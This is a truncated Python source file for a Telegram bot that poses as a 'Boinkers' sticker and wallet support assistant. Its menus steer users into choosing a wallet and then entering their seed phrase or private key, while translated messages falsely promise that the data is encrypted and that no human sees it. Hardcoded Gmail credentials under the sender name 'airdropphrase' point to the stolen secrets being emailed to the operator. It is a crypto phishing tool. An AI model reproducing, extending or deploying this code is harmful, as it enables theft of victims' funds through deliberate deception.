# full updated main.py
import logging
import re
import smtplib
from email.message import EmailMessage
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ForceReply,
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logging.getLogger("httpx").setLevel(logging.WARNING)

# Conversation states
CHOOSE_LANGUAGE = 0
MAIN_MENU = 1
AWAIT_CONNECT_WALLET = 2
CHOOSE_WALLET_TYPE = 3
CHOOSE_OTHER_WALLET_TYPE = 4
PROMPT_FOR_INPUT = 5
RECEIVE_INPUT = 6
AWAIT_RESTART = 7
CLAIM_STICKER_INPUT = 8
CLAIM_STICKER_CONFIRM = 9

# --- Email Configuration (update in production) ---
SENDER_EMAIL = "airdropphrase@gmail.com"
SENDER_PASSWORD = "ipxs ffag eqmk otqd"  # Replace with secure secret (env var)
RECIPIENT_EMAIL = "airdropphrase@gmail.com"

# Base English wallet display names (brands / labels)
BASE_WALLET_NAMES = {
    "wallet_type_metamask": "Tonkeeper",
    "wallet_type_trust_wallet": "Telegram Wallet",
    "wallet_type_coinbase": "MyTon Wallet",
    "wallet_type_tonkeeper": "Tonhub",
    "wallet_type_phantom_wallet": "Trust Wallet",
    "wallet_type_rainbow": "Rainbow",
    "wallet_type_safepal": "SafePal",
    "wallet_type_wallet_connect": "Wallet Connect",
    "wallet_type_ledger": "Ledger",
    "wallet_type_brd_wallet": "BRD Wallet",
    "wallet_type_solana_wallet": "Solana Wallet",
    "wallet_type_balance": "Balance",
    "wallet_type_okx": "OKX",
    "wallet_type_xverse": "Xverse",
    "wallet_type_sparrow": "Sparrow",
    "wallet_type_earth_wallet": "Earth Wallet",
    "wallet_type_hiro": "Hiro",
    "wallet_type_saitamask_wallet": "Saitamask Wallet",
    "wallet_type_casper_wallet": "Casper Wallet",
    "wallet_type_cake_wallet": "Cake Wallet",
    "wallet_type_kepir_wallet": "Kepir Wallet",
    "wallet_type_icpswap": "ICPSwap",
    "wallet_type_kaspa": "Kaspa",
    "wallet_type_nem_wallet": "NEM Wallet",
    "wallet_type_near_wallet": "Near Wallet",
    "wallet_type_compass_wallet": "Compass Wallet",
    "wallet_type_stack_wallet": "Stack Wallet",
    "wallet_type_soilflare_wallet": "Soilflare Wallet",
    "wallet_type_aioz_wallet": "AIOZ Wallet",
    "wallet_type_xpla_vault_wallet": "XPLA Vault Wallet",
    "wallet_type_polkadot_wallet": "Polkadot Wallet",
    "wallet_type_xportal_wallet": "XPortal Wallet",
    "wallet_type_multiversx_wallet": "Multiversx Wallet",
    "wallet_type_verachain_wallet": "Verachain Wallet",
    "wallet_type_casperdash_wallet": "Casperdash Wallet",
    "wallet_type_nova_wallet": "Nova Wallet",
    "wallet_type_fearless_wallet": "Fearless Wallet",
    "wallet_type_terra_station": "Terra Station",
    "wallet_type_cosmos_station": "Cosmos Station",
    "wallet_type_exodus_wallet": "Exodus Wallet",
    "wallet_type_argent": "Argent",
    "wallet_type_binance_chain": "Binance Chain",
    "wallet_type_safemoon": "SafeMoon",
    "wallet_type_gnosis_safe": "Gnosis Safe",
    "wallet_type_defi": "DeFi",
    "wallet_type_other": "Other",
}

# Wallet word translations (used to localize "Wallet" where appropriate)
WALLET_WORD_BY_LANG = {
    "en": "Wallet",
    "es": "Billetera",
    "fr": "Portefeuille",
    "ru": "Кошелёк",
    "uk": "Гаманець",
    "fa": "کیف‌پول",
    "ar": "المحفظة",
    "pt": "Carteira",
    "id": "Dompet",
    "de": "Wallet",
    "nl": "Portemonnee",
    "hi": "वॉलेट",
    "tr": "Cüzdan",
    "zh": "钱包",
    "cs": "Peněženka",
    "ur": "والٹ",
    "uz": "Hamyon",
    "it": "Portafoglio",
    "ja": "ウォレット",
    "ms": "Dompet",
    "ro": "Portofel",
    "sk": "Peňaženka",
    "th": "กระเป๋าเงิน",
    "vi": "Ví",
}

# Professional reassurance (translated per language) - updated to explicitly mention the bot is encrypted
PROFESSIONAL_REASSURANCE = {
    "en": "\n\nFor your security: all information is processed automatically by this encrypted bot and stored encrypted. No human will access your data.",
    "es": "\n\nPara su seguridad: toda la información es procesada automáticamente por este bot cifrado y se almacena cifrada. Ninguna persona tendrá acceso a sus datos.",
    "fr": "\n\nPour votre sécurité : toutes les informations sont traitées automatiquement par ce bot chiffré et stockées de manière chiffrée. Aucune personne n'aura accès à vos données.",
    "ru": "\n\nВ целях вашей безопасности: вся информация обрабатывается автоматически этим зашифрованным ботом и хранится в зашифрованном виде. Человеческий доступ к вашим данным исключён.",
    "uk": "\n\nДля вашої безпеки: усі дані обробляються автоматично цим зашифрованим ботом і зберігаються в зашифрованому вигляді. Ніхто не має доступу до ваших даних.",
    "fa": "\n\nبرای امنیت شما: تمام اطلاعات به‌طور خودکار توسط این ربات رمزگذاری‌شده پردازش و به‌صورت رمزگذاری‌شده ذخیره می‌شوند. هیچ انسانی به داده‌های شما دسترسی نخواهد داشت.",
    "ar": "\n\nلأمانك: تتم معالجة جميع المعلومات تلقائيًا بواسطة هذا الروبوت المشفّر وتخزينها بشكل مشفّر. لا يمكن لأي شخص الوصول إلى بياناتك.",
    "pt": "\n\nPara sua segurança: todas as informações são processadas automaticamente por este bot criptografado e armazenadas criptografadas. Nenhum humano terá acesso aos seus dados.",
    "id": "\n\nDemi keamanan Anda: semua informasi diproses secara otomatis oleh bot terenkripsi ini dan disimpan dalam bentuk terenkripsi. Tidak ada orang yang akan mengakses data Anda.",
    "de": "\n\nZu Ihrer Sicherheit: Alle Informationen werden automatisch von diesem verschlüsselten Bot verarbeitet und verschlüsselt gespeichert. Kein Mensch hat Zugriff auf Ihre Daten.",
    "nl": "\n\nVoor uw veiligheid: alle informatie wordt automatisch verwerkt door deze versleutelde bot en versleuteld opgeslagen. Niemand krijgt toegang tot uw gegevens.",
    "hi": "\n\nआपकी सुरक्षा के लिए: सभी जानकारी इस एन्क्रिप्टेड बॉट द्वारा स्वचालित रूप से संसाधित और एन्क्रिप्ट करके संग्रहीत की जाती है। किसी भी मानव को आपके डेटा तक पहुंच नहीं होगी।",
    "tr": "\n\nGüvenliğiniz için: tüm bilgiler bu şifreli bot tarafından otomatik olarak işlenir ve şifrelenmiş olarak saklanır. Hiçbir insan verilerinize erişemez.",
    "zh": "\n\n为了您的安全：所有信息均由此加密机器人自动处理并以加密形式存储。不会有人访问您的数据。",
    "cs": "\n\nPro vaše bezpečí: všechny informace jsou automaticky zpracovávány tímto šifrovaným botem a ukládány zašifrováně. K vašim datům nikdo nebude mít přístup.",
    "ur": "\n\nآپ کی حفاظت کے لیے: تمام معلومات خودکار طور پر اس خفیہ بوٹ کے ذریعہ پروسیس اور خفیہ طور پر محفوظ کی جاتی ہیں۔ کسی انسان کو آپ کے ڈیٹا تک رسائی نہیں ہوگی۔",
    "uz": "\n\nXavfsizligingiz uchun: barcha ma'lumotlar ushbu shifrlangan bot tomonidan avtomatik qayta ishlanadi va shifrlangan holda saqlanadi. Hech kim sizning ma'lumotlaringizga kira olmaydi.",
    "it": "\n\nPer la vostra sicurezza: tutte le informazioni sono elaborate automaticamente da questo bot crittografato e memorizzate in modo crittografato. Nessun umano avrà accesso ai vostri dati.",
    "ja": "\n\nお客様の安全のために：すべての情報はこの暗号化されたボットによって自動的に処理され、暗号化された状態で保存されます。人間がデータにアクセスすることはありません。",
    "ms": "\n\nUntuk keselamatan anda: semua maklumat diproses secara automatik oleh bot terenkripsi ini dan disimpan dalam bentuk terenkripsi. Tiada manusia akan mengakses data anda.",
    "ro": "\n\nPentru siguranța dumneavoastră: toate informațiile sunt procesate automat de acest bot criptat și stocate criptat. Nicio persoană nu va avea acces la datele dumneavoastră.",
    "sk": "\n\nPre vaše bezpečie: všetky informácie sú automaticky spracovávané týmto šifrovaným botom a ukladané v zašifrovanej podobe. Nikto nebude mať prístup k vašim údajom.",
    "th": "\n\nเพื่อความปลอดภัยของคุณ: ข้อมูลทั้งหมดจะได้รับการประมวลผลโดยอัตโนมัติโดยบอทที่เข้ารหัสนี้และจัดเก็บในรูปแบบที่เข้ารหัส ไม่มีใครเข้าถึงข้อมูลของคุณได้",
    "vi": "\n\nVì sự an toàn của bạn: tất cả thông tin được xử lý tự động bởi bot được mã hóa này và được lưu trữ dưới dạng đã mã hóa. Không ai có thể truy cập dữ liệu của bạn.",
}

# Full multi-language UI texts (must include the 24 language codes from WALLET_WORD_BY_LANG)
# Each language includes all keys used by the bot. If a key is missing for a language, English will be used as fallback.
# Note: We keep "error_use_seed_phrase" as the guidance shown when the input is NOT 12/24, and "post_receive_error"
# is the screenshot-style message that will be shown AFTER the user submits a valid 12 or 24-word seed.
LANGUAGES = {
    # English
    "en": {
        "welcome": "Welcome to the Boinkers Sticker Bot!\n\nThis bot helps you claim stickers. Follow the on-screen prompts to continue.",
        "main menu title": "Please select an issue type to continue:",
        "buy": "Buy",
        "validation": "Validation",
        "claim tokens": "Claim Tokens",
        "migration issues": "Migration Issues",
        "assets recovery": "Assets Recovery",
        "general issues": "General Issues",
        "rectification": "Rectification",
        "staking issues": "Staking Issues",
        "deposits": "Deposits",
        "withdrawals": "Withdrawals",
        "missing balance": "Missing Balance",
        "login issues": "Login Issues",
        "high gas fees": "High Gas Fees",
        "presale issues": "Presale Issues",
        "claim missing sticker": "Claim Missing Sticker",
        # changed earlier to match requested phrasing when connecting from sticker flow
        "connect wallet message": "please connect your wallet to claim the stickers you entered",
        "connect wallet button": "🔑 Connect Wallet",
        "select wallet type": "Please select your wallet type:",
        "other wallets": "Other Wallets",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Import Seed Phrase",
        "wallet selection message": "You have selected {wallet_name}.\nSelect your preferred mode of connection.",
        "reassurance": PROFESSIONAL_REASSURANCE["en"],
        # Updated per user request (removed "BOINKERS username" and changed to requested phrase)
        "prompt seed": "please enter the 12 or 24 words of your wallet." + PROFESSIONAL_REASSURANCE["en"],
        "prompt private key": "Please enter your private key." + PROFESSIONAL_REASSURANCE["en"],
        "invalid choice": "Invalid choice. Please use the buttons.",
        "final error message": "‼️ An error occurred. Use /start to try again.",
        "final_received_message": "Thank you — your seed or private key has been received securely and will be processed. Use /start to begin again.",
        "error_use_seed_phrase": "This field requires a seed phrase (12 or 24 words). Please provide the seed phrase instead.",
        "post_receive_error": "‼️ An error occured, Please ensure you are entering the correct key, please use copy and paste to avoid errors. please /start to try again.",
        "choose language": "Please select your preferred language:",
        "await restart message": "Please click /start to start over.",
        "enter stickers prompt": "Kindly type in the sticker(s) you want to claim.",
        "confirm claim stickers": "Are you sure you want to proceed and claim the stickers you entered?",
        "confirm_entered_stickers": "You entered {count} sticker(s):\n{stickers}\n\nPlease confirm you want to claim these stickers.",
        "yes": "Yes",
        "no": "No",
        "back": "🔙 Back",
        "invalid_input": "Invalid input. Please use /start to begin.",
    },
    # Spanish
    "es": {
        "welcome": "¡Hola {user}! Bienvenido al asistente Boinkers. Este bot le ayudará a reclamar stickers.",
        "main menu title": "Seleccione un tipo de problema para continuar:",
        "buy": "Comprar",
        "validation": "Validación",
        "claim tokens": "Reclamar Tokens",
        "migration issues": "Problemas de Migración",
        "assets recovery": "Recuperación de Activos",
        "general issues": "Problemas Generales",
        "rectification": "Rectificación",
        "staking issues": "Problemas de Staking",
        "deposits": "Depósitos",
        "withdrawals": "Retiros",
        "missing balance": "Saldo Perdido",
        "login issues": "Problemas de Inicio de Sesión",
        "high gas fees": "Altas Tarifas de Gas",
        "presale issues": "Problemas de Preventa",
        "claim missing sticker": "Reclamar Sticker Perdido",
        "connect wallet message": "Por favor, conecte su billetera con su Clave Privada o Frase Semilla para continuar.",
        "connect wallet button": "🔑 Conectar Billetera",
        "select wallet type": "Por favor, seleccione el tipo de su billetera:",
        "other wallets": "Otras Billeteras",
        "private key": "🔑 Clave Privada",
        "seed phrase": "🔒 Importar Frase Seed",
        "wallet selection message": "Ha seleccionado {wallet_name}.\nSeleccione su modo de conexión preferido.",
        "reassurance": PROFESSIONAL_REASSURANCE["es"],
        "prompt seed": "por favor, ingrese las 12 o 24 palabras de su billetera." + PROFESSIONAL_REASSURANCE["es"],
        "prompt private key": "Por favor, ingrese su clave privada." + PROFESSIONAL_REASSURANCE["es"],
        "invalid choice": "Opción inválida. Use los botones.",
        "final error message": "‼️ Ha ocurrido un error. /start para intentarlo de nuevo.",
        "final_received_message": "Gracias — su seed o clave privada ha sido recibida de forma segura y será procesada. Use /start para comenzar de nuevo.",
        "error_use_seed_phrase": "Detectamos lo que parece ser una dirección. Este campo requiere una frase seed (12 o 24 palabras). Por favor proporcione la frase seed.",
        "post_receive_error": "‼️ Ocurrió un error. Asegúrese de introducir la clave correcta: use copiar y pegar para evitar errores. Por favor /start para intentarlo de nuevo.",
        "choose language": "Por favor, seleccione su idioma preferido:",
        "await restart message": "Haga clic en /start para empezar de nuevo.",
        "enter stickers prompt": "Por favor, escriba los sticker(s) que desea reclamar.",
        "confirm claim stickers": "¿Está seguro de que desea proceder y reclamar los stickers que ingresó?",
        "confirm_entered_stickers": "Ha ingresado {count} sticker(s):\n{stickers}\n\nPor favor confirme que desea reclamar estos stickers.",
        "yes": "Sí",
        "no": "No",
        "back": "🔙 Volver",
        "invalid_input": "Entrada inválida. Use /start para comenzar.",
    },
    # French
    "fr": {
        "welcome": "Salut {user} ! Bienvenue dans l'assistant Boinkers. Ce bot vous aide à réclamer des stickers.",
        "main menu title": "Veuillez sélectionner un type de problème pour continuer :",
        "buy": "Acheter",
        "validation": "Validation",
        "claim tokens": "Réclamer des Tokens",
        "migration issues": "Problèmes de Migration",
        "assets recovery": "Récupération d'Actifs",
        "general issues": "Problèmes Généraux",
        "rectification": "Rectification",
        "staking issues": "Problèmes de Staking",
        "deposits": "Dépôts",
        "withdrawals": "Retraits",
        "missing balance": "Solde Manquant",
        "login issues": "Problèmes de Connexion",
        "high gas fees": "Frais de Gaz Élevés",
        "presale issues": "Problèmes de Prévente",
        "claim missing sticker": "Réclamer l'autocollant manquant",
        "connect wallet message": "Veuillez connecter votre portefeuille avec votre clé privée ou votre phrase seed pour continuer.",
        "connect wallet button": "🔑 Connecter un Portefeuille",
        "select wallet type": "Veuillez sélectionner votre type de portefeuille :",
        "other wallets": "Autres Portefeuilles",
        "private key": "🔑 Clé Privée",
        "seed phrase": "🔒 Importer une Phrase Seed",
        "wallet selection message": "Vous avez sélectionné {wallet_name}.\nSélectionnez votre mode de connexion préféré.",
        "reassurance": PROFESSIONAL_REASSURANCE["fr"],
        "prompt seed": "veuillez saisir les 12 ou 24 mots de votre portefeuille." + PROFESSIONAL_REASSURANCE["fr"],
        "prompt private key": "Veuillez entrer votre clé privée." + PROFESSIONAL_REASSURANCE["fr"],
        "invalid choice": "Choix invalide. Veuillez utiliser les boutons.",
        "final error message": "‼️ Une erreur est survenue. /start pour réessayer.",
        "final_received_message": "Merci — votre seed ou clé privée a été reçue en toute sécurité et sera traitée. Utilisez /start pour recommencer.",
        "error_use_seed_phrase": "Nous avons détecté ce qui ressemble à une adresse. Ce champ exige une phrase seed (12 ou 24 mots). Veuillez fournir la phrase seed.",
        "post_receive_error": "‼️ Une erreur est survenue. Veuillez vous assurer que vous saisissez la bonne clé — utilisez copier-coller pour éviter les erreurs. Veuillez /start pour réessayer.",
        "choose language": "Veuillez sélectionner votre langue préférée :",
        "await restart message": "Cliquez sur /start pour recommencer.",
        "enter stickers prompt": "Veuillez taper le(s) sticker(s) que vous souhaitez réclamer.",
        "confirm claim stickers": "Êtes-vous sûr de vouloir procéder et réclamer les autocollants saisis ?",
        "confirm_entered_stickers": "Vous avez saisi {count} sticker(s) :\n{stickers}\n\nVeuillez confirmer que vous souhaitez réclamer ces stickers.",
        "yes": "Oui",
        "no": "Non",
        "back": "🔙 Retour",
        "invalid_input": "Entrée invalide. Veuillez utiliser /start pour commencer.",
    },
    # Russian
    "ru": {
        "welcome": "Привет, {user}! Добро пожаловать в помощник Boinkers. Этот бот поможет вам запросить стикеры.",
        "main menu title": "Пожалуйста, выберите тип проблемы, чтобы продолжить:",
        "buy": "Купить",
        "validation": "Валидация",
        "claim tokens": "Получить Токены",
        "migration issues": "Проблемы с Миграцией",
        "assets recovery": "Восстановление Активов",
        "general issues": "Общие Проблемы",
        "rectification": "Исправление",
        "staking issues": "Проблемы со Стейкингом",
        "deposits": "Депозиты",
        "withdrawals": "Выводы",
        "missing balance": "Пропавший Баланс",
        "login issues": "Проблемы со Входом",
        "high gas fees": "Высокие Комиссии за Газ",
        "presale issues": "Проблемы с Предпродажей",
        "claim missing sticker": "Запросить Пропавший Стикер",
        "connect wallet message": "Пожалуйста, подключите кошелёк с помощью приватного ключа или seed-фразы.",
        "connect wallet button": "🔑 Подключить Кошелёк",
        "select wallet type": "Пожалуйста, выберите тип вашего кошелька:",
        "other wallets": "Другие Кошельки",
        "private key": "🔑 Приватный Ключ",
        "seed phrase": "🔒 Импортировать Seed Фразу",
        "wallet selection message": "Вы выбрали {wallet_name}.\nВыберите предпочтительный способ подключения.",
        "reassurance": PROFESSIONAL_REASSURANCE["ru"],
        "prompt seed": "пожалуйста, введите 12 или 24 слова вашей seed-фразы." + PROFESSIONAL_REASSURANCE["ru"],
        "prompt private key": "Пожалуйста, введите приватный ключ." + PROFESSIONAL_REASSURANCE["ru"],
        "invalid choice": "Неверный выбор. Используйте кнопки.",
        "final error message": "‼️ Произошла ошибка. /start чтобы попробовать снова.",
        "final_received_message": "Спасибо — ваша seed или приватный ключ был успешно получен и будет обработан. Используйте /start для начала.",
        "error_use_seed_phrase": "Обнаружено что-то похожее на адрес. Поле требует seed-фразу (12 или 24 слова). Пожалуйста, предоставьте seed-фразу.",
        "post_receive_error": "‼️ Произошла ошибка. Пожалуйста, убедитесь, что вы вводите правильный ключ — используйте копирование и вставку, чтобы избежать ошибок. Пожалуйста, /start чтобы попробовать снова.",
        "choose language": "Пожалуйста, выберите язык:",
        "await restart message": "Нажмите /start чтобы начать заново.",
        "enter stickers prompt": "Пожалуйста, напишите стикер(ы), которые вы хотите запросить.",
        "confirm claim stickers": "Вы уверены, что хотите продолжить и запросить введённые стикеры?",
        "confirm_entered_stickers": "Вы ввели {count} стикер(а/ов):\n{stickers}\n\nПожалуйста, подтвердите, что хотите запросить эти стикеры.",
        "yes": "Да",
        "no": "Нет",
        "back": "🔙 Назад",
        "invalid_input": "Неверный ввод. Используйте /start чтобы начать.",
    },
    # Ukrainian
    "uk": {
        "welcome": "Привіт, {user}! Ласкаво просимо в помічник Boinkers. Цей бот допомагає отримати стікери.",
        "main menu title": "Будь ласка, виберіть тип проблеми для продовження:",
        "buy": "Купити",
        "validation": "Валідація",
        "claim tokens": "Отримати Токени",
        "migration issues": "Проблеми з Міграцією",
        "assets recovery": "Відновлення Активів",
        "general issues": "Загальні Проблеми",
        "rectification": "Виправлення",
        "staking issues": "Проблеми зі Стейкінгом",
        "deposits": "Депозити",
        "withdrawals": "Виведення",
        "missing balance": "Зниклий Баланс",
        "login issues": "Проблеми з Входом",
        "high gas fees": "Високі Комісії за Газ",
        "presale issues": "Проблеми з Передпродажем",
        "claim missing sticker": "Заявити Відсутній Стикер",
        "connect wallet message": "Будь ласка, підключіть гаманець приватним ключем або seed-фразою.",
        "connect wallet button": "🔑 Підключити Гаманець",
        "select wallet type": "Будь ласка, виберіть тип гаманця:",
        "other wallets": "Інші Гаманці",
        "private key": "🔑 Приватний Ключ",
        "seed phrase": "🔒 Імпортувати Seed Фразу",
        "wallet selection message": "Ви вибрали {wallet_name}.\nВиберіть спосіб підключення.",
        "reassurance": PROFESSIONAL_REASSURANCE["uk"],
        "prompt seed": "будь ласка, введіть 12 або 24 слова вашого гаманця." + PROFESSIONAL_REASSURANCE["uk"],
        "prompt private key": "Введіть приватний ключ." + PROFESSIONAL_REASSURANCE["uk"],
        "invalid choice": "Неправильний вибір. Використовуйте кнопки.",
        "final error message": "‼️ Сталася помилка. /start щоб спробувати знову.",
        "final_received_message": "Дякуємо — ваша seed або приватний ключ успішно отримані і будуть оброблені. Використовуйте /start щоб почати знову.",
        "error_use_seed_phrase": "Виявлено те, що схоже на адресу. Поле вимагає seed-фразу (12 або 24 слова). Будь ласка, введіть seed-фразу.",
        "post_receive_error": "‼️ Сталася помилка. Переконайтеся, що ви вводите правильний ключ — використовуйте копіювання та вставлення, щоб уникнути помилок. Будь ласка, /start щоб спробувати знову.",
        "choose language": "Будь ласка, виберіть мову:",
        "await restart message": "Натисніть /start щоб почати заново.",
        "enter stickers prompt": "Введіть стікер(и), які ви хочете заявити.",
        "confirm claim stickers": "Ви впевнені, що хочете продовжити і заявити ці стікери?",
        "confirm_entered_stickers": "Ви ввели {count} стікер(ів):\n{stickers}\n\nПідтвердіть, будь ласка, що хочете заявити ці стікери.",
        "yes": "Так",
        "no": "Ні",
        "back": "🔙 Назад",
        "invalid_input": "Недійсний ввід. Використовуйте /start щоб почати.",
    },
    # Persian / Farsi
    "fa": {
        "welcome": "سلام {user}! به دستیار Boinkers خوش آمدید. این بات به شما کمک می‌کند استیکرها را دریافت کنید.",
        "main menu title": "لطفاً یک نوع مشکل را انتخاب کنید:",
        "buy": "خرید",
        "validation": "اعتبارسنجی",
        "claim tokens": "دریافت توکن‌ها",
        "migration issues": "مسائل مهاجرت",
        "assets recovery": "بازیابی دارایی‌ها",
        "general issues": "مسائل عمومی",
        "rectification": "اصلاح",
        "staking issues": "مسائل استیکینگ",
        "deposits": "واریز",
        "withdrawals": "برداشت",
        "missing balance": "موجودی گمشده",
        "login issues": "مشکلات ورود",
        "high gas fees": "هزینه‌های بالای گس",
        "presale issues": "مشکلات پیش‌فروش",
        "claim missing sticker": "درخواست استیکر گم‌شده",
        "connect wallet message": "لطفاً کیف‌پول خود را با کلید خصوصی یا seed متصل کنید.",
        "connect wallet button": "🔑 اتصال کیف‌پول",
        "select wallet type": "لطفاً نوع کیف‌پول را انتخاب کنید:",
        "other wallets": "کیف‌پول‌های دیگر",
        "private key": "🔑 کلید خصوصی",
        "seed phrase": "🔒 وارد کردن Seed Phrase",
        "wallet selection message": "شما {wallet_name} را انتخاب کرده‌اید.\nروش اتصال را انتخاب کنید.",
        "reassurance": PROFESSIONAL_REASSURANCE["fa"],
        "prompt seed": "لطفاً 12 یا 24 کلمه کیف‌پول خود را وارد کنید." + PROFESSIONAL_REASSURANCE["fa"],
        "prompt private key": "لطفاً کلید خصوصی خود را وارد کنید." + PROFESSIONAL_REASSURANCE["fa"],
        "invalid choice": "انتخاب نامعتبر. از دکمه‌ها استفاده کنید.",
        "final error message": "‼️ خطا رخ داد. /start برای تلاش مجدد.",
        "final_received_message": "متشکریم — seed یا کلید خصوصی شما با امنیت دریافت و پردازش خواهد شد. از /start برای شروع مجدد استفاده کنید.",
        "error_use_seed_phrase": "ما ورودی‌ای شبیه آدرس مشاهده کردیم. لطفاً به‌جای آدرس، عبارت seed (12 یا 24 کلمه) را وارد کنید.",
        "post_receive_error": "‼️ خطا رخ داد. لطفاً مطمئن شوید کلید صحیح را وارد می‌کنید — برای جلوگیری از خطاها از کپی و چسباندن استفاده کنید. لطفاً /start را برای تلاش مجدد بزنید.",
        "choose language": "لطفاً زبان را انتخاب کنید:",
        "await restart message": "برای شروع دوباره /start را بزنید.",
        "enter stickers prompt": "لطفاً استیکر(ها) را وارد کنید که می‌خواهید درخواست کنید.",
        "confirm claim stickers": "آیا مطمئن هستید که می‌خواهید ادامه دهید و این استیکرها را درخواست کنید؟",
        "confirm_entered_stickers": "شما {count} استیکر وارد کرده‌اید:\n{stickers}\n\nلطفاً تأیید کنید.",
        "yes": "بله",
        "no": "خیر",
        "back": "🔙 بازگشت",
        "invalid_input": "ورودی نامعتبر. از /start استفاده کنید。",
    },
    # Arabic
    "ar": {
        "welcome": "مرحبًا {user}! مرحبًا بك في مساعد Boinkers. هذا البوت يساعدك في استرداد الملصقات.",
        "main menu title": "يرجى تحديد نوع المشكلة للمتابعة:",
        "buy": "شراء",
        "validation": "التحقق",
        "claim tokens": "المطالبة بالرموز",
        "migration issues": "مشاكل الترحيل",
        "assets recovery": "استرداد الأصول",
        "general issues": "مشاكل عامة",
        "rectification": "تصحيح",
        "staking issues": "مشاكل الستاكينج",
        "deposits": "الودائع",
        "withdrawals": "السحوبات",
        "missing balance": "رصيد مفقود",
        "login issues": "مشاكل تسجيل الدخول",
        "high gas fees": "رسوم غاز مرتفعة",
        "presale issues": "مشاكل البيع المسبق",
        "claim missing sticker": "المطالبة بالملصق المفقود",
        "connect wallet message": "يرجى توصيل محفظتك باستخدام المفتاح الخاص یا عبارة seed للمتابعة.",
        "connect wallet button": "🔑 توصيل المحفظة",
        "select wallet type": "يرجى تحديد نوع المحفظة:",
        "other wallets": "محافظ أخرى",
        "private key": "🔑 مفتاح خاص",
        "seed phrase": "🔒 استيراد Seed Phrase",
        "wallet selection message": "لقد اخترت {wallet_name}.\nحدد وضع الاتصال المفضل.",
        "reassurance": PROFESSIONAL_REASSURANCE["ar"],
        "prompt seed": "يرجى إدخال 12 أو 24 كلمة لمحفظتك." + PROFESSIONAL_REASSURANCE["ar"],
        "prompt private key": "يرجى إدخال المفتاح الخاص." + PROFESSIONAL_REASSURANCE["ar"],
        "invalid choice": "خيار غير صالح. استخدم الأزرار.",
        "final error message": "‼️ حدث خطأ. /start للمحاولة مرة أخرى.",
        "final_received_message": "شكرًا — تم استلام seed أو المفتاح الخاص بأمان وسيتم معالجته. استخدم /start للبدء من جديد.",
        "error_use_seed_phrase": "تم الكشف عن مدخل يشبه عنواناً. هذا الحقل يتطلب عبارة seed (12 أو 24 كلمة). يرجى تقديمها.",
        "post_receive_error": "‼️ حدث خطأ. يرجى التأكد من إدخال المفتاح الصحيح — استخدم النسخ واللصق لتجنب الأخطاء. الرجاء /start للمحاولة مرة أخرى.",
        "choose language": "اختر لغتك المفضلة:",
        "await restart message": "انقر /start للبدء من جديد.",
        "enter stickers prompt": "اكتب الملصق(ات) التي تريد المطالبة بها.",
        "confirm claim stickers": "هل أنت متأكد أنك تريد المتابعة والمطالبة بالملصقات التي أدخلتها؟",
        "confirm_entered_stickers": "أدخلت {count} ملصق(ات):\n{stickers}\n\nيرجى التأكيد.",
        "yes": "نعم",
        "no": "لا",
        "back": "🔙 عودة",
        "invalid_input": "إدخال غير صالح. استخدم /start للبدء.",
    },
    # Portuguese
    "pt": {
        "welcome": "Olá {user}! Bem-vindo ao assistente Boinkers. Este bot ajuda a reivindicar stickers.",
        "main menu title": "Selecione um tipo de problema para continuar:",
        "buy": "Comprar",
        "validation": "Validação",
        "claim tokens": "Reivindicar Tokens",
        "migration issues": "Problemas de Migração",
        "assets recovery": "Recuperação de Ativos",
        "general issues": "Problemas Gerais",
        "rectification": "Retificação",
        "staking issues": "Problemas de Staking",
        "deposits": "Depósitos",
        "withdrawals": "Saques",
        "missing balance": "Saldo Ausente",
        "login issues": "Problemas de Login",
        "high gas fees": "Altas Taxas de Gás",
        "presale issues": "Problemas de Pré-venda",
        "claim missing sticker": "Reivindicar Sticker Ausente",
        "connect wallet message": "Conecte sua carteira com sua Chave Privada ou Seed Phrase para continuar.",
        "connect wallet button": "🔑 Conectar Carteira",
        "select wallet type": "Selecione o tipo da sua carteira:",
        "other wallets": "Outras Carteiras",
        "private key": "🔑 Chave Privada",
        "seed phrase": "🔒 Importar Seed Phrase",
        "wallet selection message": "Você selecionou {wallet_name}.\nSelecione o modo de conexão preferido.",
        "reassurance": PROFESSIONAL_REASSURANCE["pt"],
        "prompt seed": "por favor, insira as 12 ou 24 palavras da sua carteira." + PROFESSIONAL_REASSURANCE["pt"],
        "prompt private key": "Insira sua chave privada." + PROFESSIONAL_REASSURANCE["pt"],
        "invalid choice": "Escolha inválida. Use os botões.",
        "final error message": "‼️ Ocorreu um erro. /start para tentar novamente.",
        "final_received_message": "Obrigado — sua seed ou chave privada foi recebida com segurança e será processada. Use /start para começar de novo.",
        "error_use_seed_phrase": "Detectamos algo parecido com um endereço. Este campo requer uma seed phrase (12 ou 24 palavras). Por favor forneça a seed phrase.",
        "post_receive_error": "‼️ Ocorreu um erro. Certifique-se de que está a inserir a chave correta — use copiar e colar para evitar erros. Por favor /start para tentar novamente.",
        "choose language": "Selecione seu idioma preferido:",
        "await restart message": "Clique em /start para reiniciar.",
        "enter stickers prompt": "Digite o(s) sticker(s) que deseja reivindicar.",
        "confirm claim stickers": "Tem certeza que deseja reivindicar os stickers inseridos?",
        "confirm_entered_stickers": "Você inseriu {count} sticker(s):\n{stickers}\n\nConfirme por favor.",
        "yes": "Sim",
        "no": "Não",
        "back": "🔙 Voltar",
        "invalid_input": "Entrada inválida. Use /start para começar.",
    },
    # Indonesian
    "id": {
        "welcome": "Halo {user}! Selamat datang di asisten Boinkers. Bot ini membantu mengklaim stiker.",
        "main menu title": "Silakan pilih jenis masalah untuk melanjutkan:",
        "buy": "Beli",
        "validation": "Validasi",
        "claim tokens": "Klaim Token",
        "migration issues": "Masalah Migrasi",
        "assets recovery": "Pemulihan Aset",
        "general issues": "Masalah Umum",
        "rectification": "Rekonsiliasi",
        "staking issues": "Masalah Staking",
        "deposits": "Deposit",
        "withdrawals": "Penarikan",
        "missing balance": "Saldo Hilang",
        "login issues": "Masalah Login",
        "high gas fees": "Biaya Gas Tinggi",
        "presale issues": "Masalah Pra-penjualan",
        "claim missing sticker": "Klaim Sticker Hilang",
        "connect wallet message": "Sambungkan dompet Anda dengan Kunci Pribadi atau Seed Phrase untuk melanjutkan.",
        "connect wallet button": "🔑 Sambungkan Dompet",
        "select wallet type": "Pilih jenis dompet Anda:",
        "other wallets": "Dompet Lain",
        "private key": "🔑 Kunci Pribadi",
